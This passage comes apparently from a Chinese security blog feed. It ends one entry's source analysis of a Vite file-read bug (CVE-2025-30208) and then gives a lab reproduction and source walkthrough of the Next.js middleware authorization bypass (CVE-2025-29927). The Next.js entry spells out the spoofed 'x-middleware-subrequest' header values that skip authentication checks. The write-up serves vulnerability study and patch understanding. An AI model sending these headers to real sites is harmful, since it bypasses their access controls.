?? url</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">module</span> ??= environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleById</span>(id)</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">module</span>) &#123;</span><br><span class="line">    <span class="comment">// if a different url maps to an existing loaded id,  make sure we relate this url to the id</span></span><br><span class="line">    <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">_ensureEntryFromUrl</span>(url, <span class="literal">undefined</span>, resolved)</span><br><span class="line">    <span class="comment">// try use cache from id</span></span><br><span class="line">    <span class="keyword">const</span> cached = <span class="keyword">await</span> <span class="title function_">getCachedTransformResult</span>(</span><br><span class="line">      environment,</span><br><span class="line">      url,</span><br><span class="line">      <span class="variable language_">module</span>,</span><br><span class="line">      timestamp,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> (cached) <span class="keyword">return</span> cached</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">    environment,</span><br><span class="line">    id,</span><br><span class="line">    url,</span><br><span class="line">    options,</span><br><span class="line">    timestamp,</span><br><span class="line">    <span class="variable language_">module</span>,</span><br><span class="line">    resolved,</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; depsOptimizer &#125; = environment</span><br><span class="line">  <span class="keyword">if</span> (!depsOptimizer?.<span class="title function_">isOptimizedDepFile</span>(id)) &#123;</span><br><span class="line">    environment.<span class="title function_">_registerRequestProcessing</span>(id, <span class="function">() =&gt;</span> result)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331220016579.png" class="" title="This is an example image"><p>转换为module，得到磁盘中的filePath。</p><p>接下来将文件内容写入到cache然后返回到result中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const request = doTransform(environment, url, options, timestamp)</span><br><span class="line"></span><br><span class="line">// Cache the request and clear it once processing is done</span><br><span class="line">environment._pendingRequests.set(cacheKey, &#123;</span><br><span class="line">  request,</span><br><span class="line">  timestamp,</span><br><span class="line">  abort: clearCache,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">return request.finally(clearCache)</span><br></pre></td></tr></table></figure><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331220902142.png" class="" title="This is an example image"><p>最后在界面产生响应。</p><p>看看6.2.4版本（新版本）的rawRE和urlRE，这里还多了个inlineRE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const urlRE = /[?&amp;]url\b/</span><br><span class="line">const rawRE = /[?&amp;]raw\b/</span><br><span class="line">const inlineRE = /[?&amp;]inline\b/</span><br><span class="line">const trailingQuerySeparatorsRE = /[?&amp;]+$/</span><br></pre></td></tr></table></figure><p>引入了一个正则表达式&#x2F;[?&amp;]+$&#x2F;来匹配连续的?和&amp;，这段代码用于清除url末尾的多问号</p><p>这里就修补了上述漏洞！</p><p>参考文章：</p><p><a href="https://forum.butian.net/index.php/article/681">https://forum.butian.net/index.php/article/681</a></p><p><a href="https://www.xaitx.com/tech/2025-03-26.html">https://www.xaitx.com/tech/2025-03-26.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Next.js中间件鉴权绕过漏洞复现(CVE-2025-29927)</title>
      <link href="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/"/>
      <url>/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/</url>
      
        <content type="html"><![CDATA[<h2 id="一些概念了解"><a href="#一些概念了解" class="headerlink" title="一些概念了解"></a>一些概念了解</h2><p>Next.js是一个由Vercel开发的基于React的Web开发框架，它是一个“全栈框架”，开发者可以使用javascript或者typescript开发一个完整包含前后端的网站，而且前后端的代码都放在一个项目里，编写十分方便。</p><p>Next.js的后端服务，可以使用两种模式来运行，分别是node.js和edge。node.js是默认的运行模式，可以理解为代码运行在传统的node.js服务器上，他没有任何限制，可以用来操作文件、数据库等等；edge是将代码运行在边缘计算服务上，比如Vercel Edge Functions和Cloudflare Pages等。</p><p>我们可以将edge理解为一种“受限”的后端处理逻辑，它的代码运行在全球各地的CDN服务器中，离用户更近，非常适合用于处理一些“轻工作”，比如数据校验、鉴权、国际化等。但也是因为其运行在CDN节点中，它无法使用node.js的原生模块，比如文件操作等。</p><p>next.js中提供了大部分传统Web开发框架都会有的功能——middleware（中间件）。和传统后端框架相同的是，middleware在next.js中也常用来检查用户身份、国际化、设置HTTP头等；和传统后端框架不同的是，next.js的middleware一定运行在edge模式下，不一定会和后端逻辑运行在一起。</p><p>CVE-2025-29927这个漏洞就是位于middleware中。一个middleware用于检查用户身份是否合法，由于检查的过程需要查询数据库，所以它会发送一个新的请求访问用户校验API。 此时会出现一个问题，由于next.js是“全栈”框架，这个检查用户身份的API也会经过middleware，这样数据流就会进入递归死循环。next.js为了解决这个问题，就为middleware中发出的请求增加了一个x-middleware-subrequest头，每次发送请求时值添加一个“middleware”字符串；并且在收到带有x-middleware-subrequest的头且发现递归超过5次后，就不再执行middleware，这样middleware中发出的请求不会再有递归问题。 那么漏洞复现方法就呼之欲出了，攻击者只要在发送给next.js的请求中增加一个头<strong>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</strong>，就可以绕过next.js的中间件。如果开发者将校验用户身份的逻辑放在中间件里，就将导致认证绕过漏洞。</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户请求 → 中间件A（身份验证） → 发起API请求 → 中间件A再次执行 → 再次发起API请求 → ...</span><br></pre></td></tr></table></figure></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Next.js 使用内部头字段“x-middleware-subrequest”来防止递归请求导致的无限循环。攻击者可以通过在请求中伪造该头字段，跳过中间件的执行，从而绕过关键的安全检查，例如授权 Cookie 验证。 </p><h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>Next.js 15.x &lt; 15.2.3<br>Next.js 14.x &lt; 14.2.25<br>Next.js 13.x &lt; 13.5.9</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里的漏洞环境我们直接用p神的vulhub。</p><p><a href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md</a></p><img src="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/image-20250331100042571.png" class="" title="This is an example image"><p>我们用浏览器插件看看</p><img src="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/image-20250331100111643.png" class="" title="This is an example image"><p>发现是next.js框架的，且版本为15.2.2，符合漏洞版本！那么接下来我们开始漏洞复现。</p><p>这是一个需要登录的界面。</p><p>然后我们用hackbar加一个请求头即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</span><br></pre></td></tr></table></figure><img src="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/image-20250331102344712.png" class="" title="This is an example image"><p>若我们没有加请求头，访问<a href="http://192.168.79.128:3000/%E6%98%AF%E8%B7%B3%E8%BD%AC%E5%88%B0/login%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E6%88%91%E4%BB%AC%E5%8A%A0%E4%BA%86%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%A4%B4%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0/dashboard%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BA%86%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%EF%BC%81">http://192.168.79.128:3000/是跳转到/login的，但是我们我们加了这个请求头，就会跳转到/dashboard，实现了鉴权绕过！</a></p><p>这个漏洞的复现是非常简单的，接下来我们开始漏洞的源码分析。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>关键点自然在于请求头x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</p><p>在 Next.js 中，中间件（Middleware）是一种强大的工具，可以用于在请求到达 API 路由或页面组件之前执行全局逻辑，比如身份验证、请求拦截、重定向等。</p><p>Next.js 的中间件（Middleware）设计用于处理全局请求逻辑（如身份验证、请求拦截，假设开发者编写了一个身份验证中间件，其功能是：当用户访问受保护资源时，中间件需向校验 API 发送请求以验证用户权限（如查询数据库或调用外部服务）。</p><p>由于 Next.js 是「全栈框架」，所有请求（包括中间件内部发起的 API 请求）均会再次经过中间件本身。这导致以下递归流程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户请求 → 中间件A（身份验证） → 发起API请求 → 中间件A再次执行 → 再次发起API请求 → ...</span><br></pre></td></tr></table></figure><p>最终引发无限递归，导致服务崩溃或响应超时。</p><p>为打破递归循环，Next.js 引入了两项机制：</p><ul><li><strong>请求标记</strong>： 中间件内部发起的请求会自动添加 <code>x-middleware-subrequest</code> 头，其值按层级递增（如 <code>middleware:middleware:middleware</code>）。</li><li><strong>递归终止条件</strong>： 当检测到 <code>x-middleware-subrequest</code> 头中包含当前中间件标识（如 <code>middleware</code>）的次数超过阈值（默认5次），中间件直接返回空响应，终止递归</li></ul><p>主要逻辑如下：next.js-15.2.2\packages\next\src\server\web\sandbox</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> run = <span class="title function_">withTaggedErrors</span>(<span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">runWithTaggedErrors</span>(<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> runtime = <span class="keyword">await</span> <span class="title function_">getRuntimeContext</span>(params)</span><br><span class="line">  <span class="keyword">const</span> subreq = params.<span class="property">request</span>.<span class="property">headers</span>[<span class="string">`x-middleware-subrequest`</span>]</span><br><span class="line">  <span class="keyword">const</span> subrequests = <span class="keyword">typeof</span> subreq === <span class="string">&#x27;string&#x27;</span> ? subreq.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>) : []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">MAX_RECURSION_DEPTH</span> = <span class="number">5</span></span><br><span class="line">  <span class="keyword">const</span> depth = subrequests.<span class="title function_">reduce</span>(</span><br><span class="line">    <span class="function">(<span class="params">acc, curr</span>) =&gt;</span> (curr === params.<span class="property">name</span> ? acc + <span class="number">1</span> : acc),</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (depth &gt;= <span class="variable constant_">MAX_RECURSION_DEPTH</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">waitUntil</span>: <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(),</span><br><span class="line">      <span class="attr">response</span>: <span class="keyword">new</span> runtime.<span class="property">context</span>.<span class="title class_">Response</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;x-middleware-next&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里解释一下这段代码，将x-middleware-subrequest请求头赋值给subreq，再以<code>:</code>分割为数组subrequests。</p><p>若subrequests中包含当前中间件的名字，那么执行acc+1，也就是递增。当acc的值&gt;&#x3D;5时，中间件返回空相应，设置返回头为’x-middleware-next’: ‘1’，表示忽略中间件的所有逻辑（包括鉴权检查）。</p><p>所以漏洞的利用思路是，只要在发送给next.js的请求中增加一个头**x-middleware-subrequest:**，让其循环5次中间件文件路径，就可以绕过next.js的中间件。如果开发者将校验用户身份的逻辑放在中间件里，就将导致认证绕过漏洞。</p><h3 id="旧版本（v"><a href="#旧版本（v" class="headerlink" title="旧版本（v&lt;12.2）"></a>旧版本（v&lt;12.2）</h3><p>主要的处理逻辑：</p><blockquote><p>next.js&#x2F;packages&#x2F;next&#x2F;server&#x2F;next-server.ts</p></blockquote><p>如果我们有中间件，那么就会调用 runMiddleware 函数</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">async</span> <span class="title function_">runMiddleware</span>(<span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">request</span>: <span class="title class_">IncomingMessage</span></span><br><span class="line">    <span class="attr">response</span>: <span class="title class_">ServerResponse</span></span><br><span class="line">    <span class="attr">parsedUrl</span>: <span class="title class_">ParsedNextUrl</span></span><br><span class="line">    <span class="attr">parsed</span>: <span class="title class_">UrlWithParsedQuery</span></span><br><span class="line">  &#125;): <span class="title class_">Promise</span>&lt;<span class="title class_">FetchEventResult</span> | <span class="literal">null</span>&gt; &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">middlewareBetaWarning</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">page</span>: &#123; <span class="attr">name</span>?: <span class="built_in">string</span>; <span class="attr">params</span>?: &#123; [<span class="attr">key</span>: <span class="built_in">string</span>]: <span class="built_in">string</span> &#125; &#125; = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">hasPage</span>(params.<span class="property">parsedUrl</span>.<span class="property">pathname</span>)) &#123;</span><br><span class="line">      page.<span class="property">name</span> = params.<span class="property">parsedUrl</span>.<span class="property">pathname</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">dynamicRoutes</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> dynamicRoute <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">dynamicRoutes</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> matchParams = dynamicRoute.<span class="title function_">match</span>(params.<span class="property">parsedUrl</span>.<span class="property">pathname</span>)</span><br><span class="line">        <span class="keyword">if</span> (matchParams) &#123;</span><br><span class="line">          page.<span class="property">name</span> = dynamicRoute.<span class="property">page</span></span><br><span class="line">          page.<span class="property">params</span> = matchParams</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> subreq = params.<span class="property">request</span>.<span class="property">headers</span>[<span class="string">`x-middleware-subrequest`</span>]</span><br><span class="line">    <span class="keyword">const</span> subrequests = <span class="keyword">typeof</span> subreq === <span class="string">&#x27;string&#x27;</span> ? subreq.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>) : []</span><br><span class="line">    <span class="keyword">const</span> allHeaders = <span class="keyword">new</span> <span class="title class_">Headers</span>()</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">result</span>: <span class="title class_">FetchEventResult</span> | <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> middleware <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">middleware</span> || []) &#123;</span><br><span class="line">      <span class="keyword">if</span> (middleware.<span class="title function_">match</span>(params.<span class="property">parsedUrl</span>.<span class="property">pathname</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">hasMiddleware</span>(middleware.<span class="property">page</span>, middleware.<span class="property">ssr</span>))) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`The Edge Function for <span class="subst">$&#123;middleware.page&#125;</span> was not found`</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">ensureMiddleware</span>(middleware.<span class="property">page</span>, middleware.<span class="property">ssr</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> middlewareInfo = <span class="title function_">getMiddlewareInfo</span>(&#123;</span><br><span class="line">          <span class="attr">dev</span>: <span class="variable language_">this</span>.<span class="property">renderOpts</span>.<span class="property">dev</span>,</span><br><span class="line">          <span class="attr">distDir</span>: <span class="variable language_">this</span>.<span class="property">distDir</span>,</span><br><span class="line">          <span class="attr">page</span>: middleware.<span class="property">page</span>,</span><br><span class="line">          <span class="attr">serverless</span>: <span class="variable language_">this</span>.<span class="property">_isLikeServerless</span>,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (subrequests.<span class="title function_">includes</span>(middlewareInfo.<span class="property">name</span>)) &#123;</span><br><span class="line">          result = &#123;</span><br><span class="line">            <span class="attr">response</span>: <span class="title class_">NextResponse</span>.<span class="title function_">next</span>(),</span><br><span class="line">            <span class="attr">waitUntil</span>: <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(),</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = <span class="keyword">await</span> <span class="title function_">run</span>(&#123;</span><br><span class="line">          <span class="attr">name</span>: middlewareInfo.<span class="property">name</span>,</span><br><span class="line">          <span class="attr">paths</span>: middlewareInfo.<span class="property">paths</span>,</span><br><span class="line">          <span class="attr">request</span>: &#123;</span><br><span class="line">            <span class="attr">headers</span>: params.<span class="property">request</span>.<span class="property">headers</span>,</span><br><span class="line">            <span class="attr">method</span>: params.<span class="property">request</span>.<span class="property">method</span> || <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="attr">nextConfig</span>: &#123;</span><br><span class="line">              <span class="attr">basePath</span>: <span class="variable language_">this</span>.<span class="property">nextConfig</span>.<span class="property">basePath</span>,</span><br><span class="line">              <span class="attr">i18n</span>: <span class="variable language_">this</span>.<span class="property">nextConfig</span>.<span class="property">i18n</span>,</span><br><span class="line">              <span class="attr">trailingSlash</span>: <span class="variable language_">this</span>.<span class="property">nextConfig</span>.<span class="property">trailingSlash</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">url</span>: (params.<span class="property">request</span> <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">__NEXT_INIT_URL</span>,</span><br><span class="line">            <span class="attr">page</span>: page,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">ssr</span>: !!<span class="variable language_">this</span>.<span class="property">nextConfig</span>.<span class="property">experimental</span>.<span class="property">concurrentFeatures</span>,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> result.<span class="property">response</span>.<span class="property">headers</span>) &#123;</span><br><span class="line">          allHeaders.<span class="title function_">append</span>(key, value)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">renderOpts</span>.<span class="property">dev</span>) &#123;</span><br><span class="line">          result.<span class="property">waitUntil</span>.<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Uncaught: middleware waitUntil errored`</span>, error)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!result.<span class="property">response</span>.<span class="property">headers</span>.<span class="title function_">has</span>(<span class="string">&#x27;x-middleware-next&#x27;</span>)) &#123;</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!result) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">render404</span>(params.<span class="property">request</span>, params.<span class="property">response</span>, params.<span class="property">parsed</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> allHeaders) &#123;</span><br><span class="line">        result.<span class="property">response</span>.<span class="property">headers</span>.<span class="title function_">set</span>(key, value)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们看一下以下代码：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (subrequests.<span class="title function_">includes</span>(middlewareInfo.<span class="property">name</span>)) &#123;</span><br><span class="line">      result = &#123;</span><br><span class="line">        <span class="attr">response</span>: <span class="title class_">NextResponse</span>.<span class="title function_">next</span>(),</span><br><span class="line">        <span class="attr">waitUntil</span>: <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(),</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果subrequests数组中包含middlewareInfo.name，那么这个中间件直接跳过，返回NextResponse.next()，请求会继续前进，完全绕过该中间件的执行。</p><p>所以我们的绕过思路就是让x-middleware-subrequest请求头包含中间件的名称，从而欺骗runMiddleware认为该中间件已经执行过，导致其被跳过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard/team/admin HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">x-middleware-subrequest: pages/_middleware</span><br></pre></td></tr></table></figure><p>那么接下来我们需要知道的是中间件的名称，只要有了中间件的名称那么我们就可以实现鉴权绕过了。</p><p>首先中间件必须命名为 <code> _middleware.ts</code></p><p>必须位于 pages&#x2F; 目录或其子目录下（因为 App Router 在 13 版本才推出）</p><p>因此：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-middleware-subrequest: pages/_middleware</span><br></pre></td></tr></table></figure><p>若中间件位于 <code>/pages/dashboard/_middleware.ts</code>，则 <code>middlewareInfo.name</code> 为 <code>pages/dashboard/_middleware</code>，攻击者只需在请求头中设置 <code>x-middleware-subrequest: pages/dashboard/_middleware</code> 即可绕过。</p><h3 id="新版本（v-12-2）"><a href="#新版本（v-12-2）" class="headerlink" title="新版本（v&gt;&#x3D;12.2）"></a>新版本（v&gt;&#x3D;12.2）</h3><p>新版本其实就是我们在漏洞分析中所说的：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> run = <span class="title function_">withTaggedErrors</span>(<span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">runWithTaggedErrors</span>(<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> runtime = <span class="keyword">await</span> <span class="title function_">getRuntimeContext</span>(params)</span><br><span class="line">  <span class="keyword">const</span> subreq = params.<span class="property">request</span>.<span class="property">headers</span>[<span class="string">`x-middleware-subrequest`</span>]</span><br><span class="line">  <span class="keyword">const</span> subrequests = <span class="keyword">typeof</span> subreq === <span class="string">&#x27;string&#x27;</span> ? subreq.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>) : []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">MAX_RECURSION_DEPTH</span> = <span class="number">5</span></span><br><span class="line">  <span class="keyword">const</span> depth = subrequests.<span class="title function_">reduce</span>(</span><br><span class="line">    <span class="function">(<span class="params">acc, curr</span>) =&gt;</span> (curr === params.<span class="property">name</span> ? acc + <span class="number">1</span> : acc),</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (depth &gt;= <span class="variable constant_">MAX_RECURSION_DEPTH</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">waitUntil</span>: <span class="title 